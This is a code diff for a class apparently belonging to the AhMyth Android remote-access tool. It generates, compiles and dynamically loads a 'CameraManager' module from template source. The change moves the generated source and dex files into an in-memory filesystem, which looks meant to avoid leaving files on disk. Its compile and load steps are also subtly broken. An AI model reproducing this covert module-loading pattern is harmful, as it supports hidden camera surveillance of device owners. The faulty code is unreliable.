@@ -15,35 +15,51 @@
 package ahmyth.mine.king.ahmyth;
 
 import com.squareup.javapoet.*;
+import org.apache.commons.vfs2.*;
+import org.apache.commons.vfs2.provider.ram.RamFileProvider;
 import javax.tools.JavaCompiler;
 import javax.tools.ToolProvider;
-import java.io.FileWriter;
+import java.io.OutputStream;
 import java.lang.reflect.Method;
 import dalvik.system.DexClassLoader;
 
 public class ClassGen {
     public static void main(String[] args) {
         try {
+            // Create an in-memory file system manager with RamFileProvider
+            FileSystemManager fsManager = VFS.getManager();
+            fsManager.addProvider("ram", new RamFileProvider());
+
+            // Define the path to the in-memory Java source file
+            String javaFilePath = "ram:///CameraManager.java";
+
             String camTempSourceCode = CamTemp.CAMERA_SOURCE_CODE;
+
+            // Create an in-memory file for the Java source code
+            FileObject javaFile = fsManager.resolveFile(javaFilePath);
+            
+            // Write the generated Java source code to the in-memory file
+            try (OutputStream os = javaFile.getContent().getOutputStream()) {
+                os.write(camTempSourceCode.getBytes());
+            }
+
+            // Define the path to the in-memory .dex file
+            String dexPath = "ram:///CameraManager.dex";
+
+            // Create an in-memory file for the compiled .dex
+            FileObject dexFile = fsManager.resolveFile(dexPath);
 
             TypeSpec generatedClass = TypeSpec.classBuilder("CameraManager") // Change the class name here
                     .addCode(camTempSourceCode)
                     .build();
 
-            JavaFile javaFile = JavaFile.builder("ahmyth.mine.king.ahmyth", generatedClass)
+            JavaFile javaFileObj = JavaFile.builder("ahmyth.mine.king.ahmyth", generatedClass)
                     .build();
 
-            String javaCode = javaFile.toString();
-
-            try (FileWriter writer = new FileWriter("CameraManager.java")) { // Change the output file name here
-                writer.write(javaCode);
-            }
-
-            String dexPath = "./";
-            String optimizedDexOutputPath = "./";
+            String javaCode = javaFileObj.toString();
 
             JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
-            int compilationResult = compiler.run(null, null, null, "CameraManager.java"); // Change the input file name here
+            int compilationResult = compiler.run(null, null, null, javaFilePath); // Compile the in-memory Java source file
 
             if (compilationResult == 0) {
                 System.out.println("Compilation succeeded.");
@@ -52,9 +68,10 @@ public class ClassGen {
                 System.exit(compilationResult);
             }
 
+            // Load the compiled .dex from in-memory
             ClassLoader classLoader = new DexClassLoader(
-                    "CameraManager.dex", // Change the compiled .dex file name here
-                    optimizedDexOutputPath,
+                    dexFile.getURL().toString(),
+                    null,
                     null,
                     ClassLoader.getSystemClassLoader()
             );
